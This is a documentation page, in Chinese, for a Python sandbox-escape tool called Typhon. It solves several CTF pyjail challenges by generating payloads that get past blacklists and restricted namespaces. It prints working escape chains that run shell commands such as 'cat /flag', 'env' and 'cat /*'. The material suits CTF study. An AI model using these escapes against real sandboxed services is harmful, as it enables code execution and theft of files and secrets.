EXAMPLE 示例
============

此页用于提供关于 ``Typhon`` 的一些实战例题。

PwnyCTF 2025-Pyjail 2
---------------------------------------------------

题目链接： https://ctf.sigpwny.com/challenges#Vault/Pyjail%202-633

.. code-block:: python
    :linenos:
    :emphasize-lines: 3,26

    #!/usr/bin/env python3

    #Flag is at /flag.txt

    def is_bad(user_input):
        banned = '"*\'`x'

        for c in banned:
            if c in user_input:
                return True
        
        return False


    def main():

        print("You wake up in the jail gym. Your head is still sore from the bonk.")

        user_input = input('What do you have to say for yourself? ')

        if is_bad(user_input):
            print('Sorry, not good enough. Go back to jail.')
            return
        
        try:
            exec(user_input)
            print("Ok, we'll consider it.")
        except:
            print('Sorry, not good enough. Go back to jail.')


    if __name__ == '__main__':
        main()

flag位于 ``/flag.txt`` 文件中。

注意到第25行存在执行函数： ``exec(user_input)``。同时，此题目的WAF有且仅有 ``is_bad()`` 函数，其功能为检测用户输入是否包含 ``"``、 ``'``、 ``*``、  `````、 ``x``。

此处我们将执行行删去，换为对应的命令。

我们将 ``main()`` 函数改为：

.. code-block:: python
    :linenos:
    :emphasize-lines: 12,13

    def main():

        print("You wake up in the jail gym. Your head is still sore from the bonk.")

        user_input = input('What do you have to say for yourself? ')

        if is_bad(user_input):
            print('Sorry, not good enough. Go back to jail.')
            return
        
        try:
            import Typhon
            Typhon.bypassRCE('cat /flag.txt', banned_chr = '"*\'`x')
            print("Ok, we'll consider it.")
        except:
            print('Sorry, not good enough. Go back to jail.')

运行，随意输入使得控制流进入 :func:`bypassRCE` 函数，即可得到flag（在 ``input()`` 时直接回车即可）。

.. code-block::
    :emphasize-lines: 34

    You wake up in the jail gym. Your head is still sore from the bonk.
    What do you have to say for yourself?

        .-')          _                 Typhon: a pyjail bypassing tool
       (`_^ (    .----`/
        ` )  \_/`   __/     __,    [Typhon Version]: v1.0.10
        __{   |`  __/      /_/     [Python Version]: v3.13.4
       / _{    \__/ '--.  //       [Github]: https://github.com/Team-intN18-SoybeanSeclab/Typhon
       \_> \_\  >__/    \((        [Author]: LamentXU <lamentxu644@gmail.com>
            _/ /` _\_   |))

    WARNING [!] banned_chr should be a list, converting to list for compatibility.
    WARNING [!] local scope not specified, using the global scope.
    INFO [*] 7 paths found to directly getshell. Try to bypass blacklist with them. Please be paitent.
    Bypassing (7/7): [===============================================================================>] 100.0%
    INFO [+] directly getshell success. 49 payload(s) in total.
    INFO [+] You now can use this payload to getshell directly with proper input.




    -----------Progress-----------


    directly input bypass(49 payloads found): help()


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    help()


    +++++++++++Jail broken+++++++++++

此时，我们再远程环境中输入 ``help()`` 再利用 `相应的技术 <https://typhonbreaker.readthedocs.io/zh-cn/latest/FAQ.html#help-rce>`_ 进行绕过即可 。

HNCTF 2022-calc_jail_beginner_level1
----------------------------------------------------------------

.. code-block:: python
    :linenos:
    :emphasize-lines: 6,29

    #the function of filter will banned some string ',",i,b
    #it seems banned some payload 
    #Can u escape it?Good luck!

    def filter(s):
        not_allowed = set('"\'`ib')
        return any(c in not_allowed for c in s)

    WELCOME = '''
    _                _                           _       _ _   _                _ __ 
    | |              (_)                         (_)     (_) | | |              | /_ |
    | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
    | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
    | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
    |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
                __/ |                          _/ |                                  
                |___/                          |__/                                                                                      
    '''

    print(WELCOME)

    print("Welcome to the python jail")
    print("Let's have an beginner jail of calc")
    print("Enter your expression and I will evaluate it for you.")
    input_data = input("> ")
    if filter(input_data):
        print("Oh hacker!")
        exit(0)
    print('Answer: {}'.format(eval(input_data)))

同上题，我们将 ``eval`` 所包含的行改为对应的绕过函数。将黑名单 ``"'`ib`` 作为 :attr:`~bypassRCE.banned_chr` 参数传入即可。（我们假设flag在 ``/flag`` ）

此题中，为了追求更好的演示效果，我们假设这个程序不支持后续的输入（否则 ``help`` 直接可以解出，可以查看 `此题 <https://typhonbreaker.readthedocs.io/zh-cn/latest/EXAMPLE.html#pwnyctf-2025-pyjail-2>`_ 的说明）。此处我们将 :attr:`~bypassRCE.interactive` 设置为 ``False``

.. code-block:: python
    :linenos:
    :emphasize-lines: 29,30

    #the function of filter will banned some string ',",i,b
    #it seems banned some payload 
    #Can u escape it?Good luck!

    def filter(s):
        not_allowed = set('"\'`ib')
        return any(c in not_allowed for c in s)

    WELCOME = '''
    _                _                           _       _ _   _                _ __ 
    | |              (_)                         (_)     (_) | | |              | /_ |
    | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
    | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
    | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
    |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
                __/ |                          _/ |                                  
                |___/                          |__/                                                                                      
    '''

    print(WELCOME)

    print("Welcome to the python jail")
    print("Let's have an beginner jail of calc")
    print("Enter your expression and I will evaluate it for you.")
    input_data = input("> ")
    if filter(input_data):
        print("Oh hacker!")
        exit(0)
    import Typhon
    Typhon.bypassRCE('cat /flag', banned_chr = '"\'`ib', interactive = False)

运行，使程序进行到 :func:`bypassRCE` 函数即可：

.. code-block::
    :emphasize-lines: 41

    -----------Progress-----------


    directly input bypass(0 payload found): None
    generator(0 payload found): None
    type(1 payload found): type
    object(2 payloads found): str().__class__.__mro__[1]
    bytes(3 payloads found): type(str().encode())
    builtins set(10 payloads found): vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)]
    builtins module(24 payloads found): all.__self__
    builtins(1 payload found): __builtins__
    import(6 payloads found): getattr(all.__self__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))
    load_module(7 payloads found): all.__self__.__loader__.load_module
    modules(1 payload found): all.__self__.__loader__.load_module(chr(115)+chr(121)+chr(115)).modules
    os(16 payloads found): all.__self__.__loader__.load_module(chr(111)+chr(115))
    subprocess(16 payloads found): all.__self__.__loader__.load_module(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115))
    uuid(16 payloads found): all.__self__.__loader__.load_module(chr(117)+chr(117)+chr(105)+chr(100))
    pydoc(16 payloads found): all.__self__.__loader__.load_module(chr(112)+chr(121)+chr(100)+chr(111)+chr(99))
    multiprocessing(16 payloads found): all.__self__.__loader__.load_module(chr(109)+chr(117)+chr(108)+chr(116)+chr(105)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(105)+chr(110)+chr(103))
    codecs(16 payloads found): all.__self__.__loader__.load_module(chr(99)+chr(111)+chr(100)+chr(101)+chr(99)+chr(115))
    warnings(16 payloads found): all.__self__.__loader__.load_module(chr(119)+chr(97)+chr(114)+chr(110)+chr(105)+chr(110)+chr(103)+chr(115))
    base64(16 payloads found): all.__self__.__loader__.load_module(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52))
    importlib(16 payloads found): all.__self__.__loader__.load_module(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(108)+chr(105)+chr(98))
    weakref(16 payloads found): all.__self__.__loader__.load_module(chr(119)+chr(101)+chr(97)+chr(107)+chr(114)+chr(101)+chr(102))
    reprlib(16 payloads found): all.__self__.__loader__.load_module(chr(114)+chr(101)+chr(112)+chr(114)+chr(108)+chr(105)+chr(98))
    sys(17 payloads found): all.__self__.__loader__.load_module(chr(115)+chr(121)+chr(115))
    linecache(16 payloads found): all.__self__.__loader__.load_module(chr(108)+chr(105)+chr(110)+chr(101)+chr(99)+chr(97)+chr(99)+chr(104)+chr(101))
    io(16 payloads found): all.__self__.__loader__.load_module(chr(105)+chr(111))
    ctypes(16 payloads found): all.__self__.__loader__.load_module(chr(99)+chr(116)+chr(121)+chr(112)+chr(101)+chr(115))
    profile(16 payloads found): all.__self__.__loader__.load_module(chr(112)+chr(114)+chr(111)+chr(102)+chr(105)+chr(108)+chr(101))
    timeit(16 payloads found): all.__self__.__loader__.load_module(chr(116)+chr(105)+chr(109)+chr(101)+chr(105)+chr(116))
    __import__2RCE(95 payloads found): all.__self__.__loader__.load_module(chr(111)+chr(115)).system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    all.__self__.__loader__.load_module(chr(111)+chr(115)).system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))


    +++++++++++Jail broken+++++++++++


Typhon-Sample Pyjail 1 
----------------------

本题目由此文档编写。

.. code-block:: python
    :linenos:
    :emphasize-lines: 1,24,37

        # flag in env
        WELCOME = '''
        _     ______      _                              _       _ _ 
        | |   |  ____|    (_)                            | |     (_) |
        | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
        | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |·
        | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
        |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
                    __/ |                                           
                    |___/                                            
        '''
        import string

        print(WELCOME)

        print("Welcome to the python jail")
        print("Let's have an beginner jail of calc")
        print("Enter your expression and I will evaluate it for you.")
        if __name__ == '__main__':
            while True:
                try:
                    suc = True
                    cmd = input("Enter command: ")
                    blacklist = ['__loader__','__import__','os','\\x','+','join', '"', "'",'2','3','4','5','6','7','8','9','subprocess','[',']','sys',
                                        'pty','uuid','future','codecs','io','multi']
                    for i in blacklist:
                        if i in cmd:
                            print("Command not allowed")
                            suc = False
                            break
                    for i in cmd:
                        if i not in string.printable:
                            print("Command not allowed")
                            suc = False
                            break
                    if suc:
                        print(eval(cmd, {'__builtins__':None, 'st':str}))
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f'e ==> {e}')
                    pass

可以看到该题目有如下限制：

- 禁止使用 ``__loader__``、 ``__import__``、 ``os``、 ``\\x``、 ``+``、 ``join``、 ``"``、 ``'``、 ``2``、 ``3``、 ``4``、 ``5``、 ``6``、 ``7``、 ``8``、 ``9``、 ``subprocess``、 ``[``、 ``]``、 ``sys``、 ``pty``、 ``uuid``、 ``future``、 ``codecs``、 ``io``、 ``multi`` 等关键字。

- 禁止使用除 ``printable`` 字符集以外的字符。

- 命名空间为 ``{'__builtins__':None, 'st':str}`` 函数。

我们可以利用 ``Typhon`` 库中的 :func:`bypassRCE` 函数绕过限制。由于flag在环境中，我们执行 ``env`` 即可得到flag。

.. code-block:: python
    :linenos:

        import Typhon
        Typhon.bypassRCE(
            'env',
            local_scope = {'__builtins__':None, 'st':str},
            banned_chr = ['__loader__','__import__','os','\\x','+','join', '"', "'",'2','3','4','5','6','7','8','9','subprocess','[',']','sys',
                                        'pty','uuid','future','codecs','io','multi']
            )

.. tip::

    此处由于已经指定了命名空间，我们可以不在源代码上做修改，直接另起一个脚本调用 :func:`bypassRCE` 函数。但当题目没有指定命名空间时（即没有 ``local_scope`` 参数时），我们需要在源代码中调用 ``Typhon.bypassRCE()`` 函数。
    假如你不确定的话，也可以只在源代码中调用。

执行上述代码，即可得到payload。

.. note:: 

    对于复杂度较高的题目，可能需要等候较长时间。 `想提升性能？ <https://typhonbreaker.readthedocs.io/zh-cn/latest/FAQ.html#id3>`_ 

.. code-block::
    :emphasize-lines: 31

    -----------Progress-----------


    directly input bypass(0 payload found): None
    generator(3 payloads found): (a for a in ()).gi_frame
    type(2 payloads found): st.__class__
    object(5 payloads found): ().__class__.__mro__.__getitem__(1)
    bytes(2 payloads found): st.__class__(st().encode())
    import(0 payload found): None
    load_module(0 payload found): None
    modules(1 payload found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules
    builtins(3 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0b101).__add__(st.__doc__.__getitem__(0b100100)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(1)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0)))
    sys(3 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0)))
    os(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0)))
    codecs(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b1000).__add__(st.__doc__.__getitem__(0b100)).__add__(st.__doc__.__getitem__(0b110000)).__add__(st.__doc__.__getitem__(0b111)).__add__(st.__doc__.__getitem__(0b1000)).__add__(st.__doc__.__getitem__(0)))
    warnings(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b1010100).__add__(st.__doc__.__getitem__(0b1001100)).__add__(st.__doc__.__getitem__(0b10)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0b110011)).__add__(st.__doc__.__getitem__(0)))
    importlib(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b110001).__add__(st.__doc__.__getitem__(0b1100111)).__add__(st.__doc__.__getitem__(0b10010101)).__add__(st.__doc__.__getitem__(0b100)).__add__(st.__doc__.__getitem__(0b10)).__add__(st.__doc__.__getitem__(1)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101)))
    reprlib(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b10).__add__(st.__doc__.__getitem__(0b111)).__add__(st.__doc__.__getitem__(0b10010101)).__add__(st.__doc__.__getitem__(0b10)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101)))
    linecache(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b11010000).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0b111)).__add__(st.__doc__.__getitem__(0b1000)).__add__(st.__doc__.__getitem__(0b1001100)).__add__(st.__doc__.__getitem__(0b1000)).__add__(st.__doc__.__getitem__(0b1101010)).__add__(st.__doc__.__getitem__(0b111)))
    io(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b110001).__add__(st.__doc__.__getitem__(0b100)))
    exec(0 payload found): None
    __import__2RCE(1 payload found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read()


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read()
    Reminder: index 0 of st.__doc__[0] must match the string literal s.
    Reminder: index 4 of st.__doc__[4] must match the string literal o.
    Reminder: index 7 of st.__doc__[7] must match the string literal e.
    Reminder: index 27 of st.__doc__[27] must match the string literal y.
    Reminder: index 45 of st.__doc__[45] must match the string literal n.
    Reminder: index 111 of st.__doc__[111] must match the string literal v.
    Reminder: 110 is the index of StreamReaderWriter, path to sys must fit in index of StreamReaderWriter


    +++++++++++Jail broken+++++++++++

根据 ``reminder`` 信息稍微调整payload即可得到flag。

0xgame 2025 消栈逃出沙箱(1)反正不会有2
----------------------------------------------------------------

感谢 `Pure Stream <https://marblue.pink/>`_ 对题的授权。

题目源码：

.. code-block:: python
    :linenos:

    from flask import Flask, request, Response
    import sys
    import io

    app = Flask(__name__)

    blackchar = "&*^%#${}@!~`·/<>"

    def safe_sandbox_Exec(code):
        whitelist = {
            "print": print,
            "list": list,
            "len": len,
            "Exception": Exception
        }

        safe_globals = {"__builtins__": whitelist}

        original_stdout = sys.stdout
        original_stderr = sys.stderr

        sys.stdout = io.StringIO()
        sys.stderr = io.StringIO()
        
        try:
            exec(code, safe_globals)
            output = sys.stdout.getvalue()
            error = sys.stderr.getvalue()
            return output or error or "No output"
        except Exception as e:
            return f"Error: {e}"
        finally:
            sys.stdout = original_stdout
            sys.stderr = original_stderr

    @app.route('/')
    def index():
        return open(__file__).read()


    @app.route('/check', methods=['POST'])
    def check():
        data = request.form['data']
        if not data:
            return Response("NO data", status=400)
        for d in blackchar:
            if d in data:
                return Response("NONONO", status=400)
        secret = safe_sandbox_Exec(data)
        return Response(secret, status=200)

    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=9000)

这是一个由 `Flask <https://flask.org.cn/en/stable/>`_ 框架构建的含有 pyjail 挑战的 web 服务器。我们不难注意，此题目唯一的 waf 是其对命名空间的限制：

.. code-block:: python
    :linenos:

        whitelist = {
            "print": print,
            "list": list,
            "len": len,
            "Exception": Exception
        }

        safe_globals = {"__builtins__": whitelist}

由于这是一道web题目，我们不能控制程序的 stdin （即，类似于 ``input()`` , ``help()`` 的函数）。因此，我们将 :attr:`~bypassRCE.interactive` 设置为 ``False``

.. code-block:: python
    :linenos:

    import Typhon

    Typhon.bypassRCE(
        "cat /*",
        local_scope={
            "__builtins__": {
                "print": print,
                "list": list,
                "len": len,
                "Exception": Exception,
            }
        },
        interactive=False,
    )

运行，我们可得：

.. code-block::
    :emphasize-lines: 42

    -----------Progress-----------


    directly input bypass(0 payload found): None
    generator(3 payloads found): (a for a in ()).gi_frame
    type(2 payloads found): list.__class__
    object(6 payloads found): {}.__class__.__mro__[1]
    bytes(3 payloads found): list.__class__(''.encode())
    builtins set(5 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']
    builtins module(0 payload found): None
    import(6 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']
    load_module(6 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__loader__'].load_module
    modules(1 payload found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys').modules
    os(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os')
    subprocess(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('subprocess')
    uuid(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('uuid')
    pydoc(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('pydoc')
    multiprocessing(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('multiprocessing')
    builtins(4 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('builtins')
    codecs(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('codecs')
    warnings(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('warnings')
    base64(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('base64')
    importlib(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('importlib')
    weakref(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('weakref')
    reprlib(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('reprlib')
    sys(4 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('sys')
    linecache(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('linecache')
    io(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('io')
    ctypes(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('ctypes')
    profile(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile')
    timeit(3 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('timeit')
    exec(32 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('profile').run
    __import__2RCE(20 payloads found): {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('cat /*')


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    {}.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('cat /*')


    +++++++++++Jail broken+++++++++++

使用上述 payload 读取根目录下所有文件（包含 ``/flag`` ）。

.. note::

    此题的预期解法为利用 ``Exception`` 的 ``__traceback__`` 获取生成器通过栈帧寻找 ``__builtins__``。这涉及到多行绕过。

    Typhon目前还不支持此类题解，类似的解法将在下一个版本中得到实现。